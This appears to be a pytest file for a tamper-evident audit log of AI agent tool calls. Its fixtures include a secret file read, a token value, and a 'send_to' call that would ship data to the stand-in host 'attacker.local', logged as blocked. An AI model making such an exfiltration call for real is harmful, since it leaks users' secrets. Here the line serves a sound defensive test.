"""Tests for audit logging system."""

import tempfile
from pathlib import Path

import pytest

from audit.log import append, validate_chain


def test_append_and_validate_chain():
    """Test appending entries and validating the chain."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        
        # Append 3 entries
        entries = [
            {"tool": "read_file", "args": {"path": "data/secret.txt"}, "decision": "ALLOW", "reason": "OK"},
            {"tool": "summarize", "args": {"text": "SECRET_TOKEN=DEADBEEF"}, "decision": "ALLOW", "reason": "OK"},
            {"tool": "send_to", "args": {"url": "http://attacker.local/ingest", "content": "summary"}, "decision": "BLOCK", "reason": "Blocked external URL"}
        ]
        
        for entry in entries:
            append(entry, log_path)
        
        # Validate chain should be True
        assert validate_chain(log_path) is True
        
        # Check we have 3 lines
        with open(log_path, "r") as f:
            lines = f.readlines()
            assert len(lines) == 3


def test_validate_chain_corrupted_middle():
    """Test that corrupted middle line causes validation to fail."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        
        # Create valid entries
        entries = [
            {"tool": "read_file", "args": {"path": "data/secret.txt"}, "decision": "ALLOW", "reason": "OK"},
            {"tool": "summarize", "args": {"text": "SECRET_TOKEN=DEADBEEF"}, "decision": "ALLOW", "reason": "OK"},
            {"tool": "send_to", "args": {"url": "http://attacker.local/ingest", "content": "summary"}, "decision": "BLOCK", "reason": "Blocked external URL"}
        ]
        
        for entry in entries:
            append(entry, log_path)
        
        # Corrupt middle line by flipping a byte
        with open(log_path, "r+b") as f:
            f.seek(0)
            lines = f.readlines()
            # Find middle line and flip a byte
            middle_line_pos = len(lines[0]) + len(lines[1])
            f.seek(middle_line_pos)
            byte = f.read(1)
            f.seek(middle_line_pos)
            f.write(bytes([ord(byte) ^ 1]))  # Flip one bit
        
        # Validation should fail
        assert validate_chain(log_path) is False


def test_validate_chain_truncated():
    """Test that truncated last line causes validation to fail."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        
        # Create valid entries
        entries = [
            {"tool": "read_file", "args": {"path": "data/secret.txt"}, "decision": "ALLOW", "reason": "OK"},
            {"tool": "summarize", "args": {"text": "SECRET_TOKEN=DEADBEEF"}, "decision": "ALLOW", "reason": "OK"},
            {"tool": "send_to", "args": {"url": "http://attacker.local/ingest", "content": "summary"}, "decision": "BLOCK", "reason": "Blocked external URL"}
        ]
        
        for entry in entries:
            append(entry, log_path)
        
        # Truncate last line
        with open(log_path, "r+b") as f:
            f.seek(0, 2)  # Seek to end
            file_size = f.tell()
            f.truncate(file_size - 10)  # Remove last 10 bytes
        
        # Validation should fail
        assert validate_chain(log_path) is False


def test_empty_log_is_valid():
    """Test that empty log is considered valid."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "audit.jsonl"
        assert validate_chain(log_path) is True


def test_nonexistent_log_is_valid():
    """Test that nonexistent log is considered valid."""
    with tempfile.TemporaryDirectory() as tmpdir:
        log_path = Path(tmpdir) / "nonexistent.jsonl"
        assert validate_chain(log_path) is True
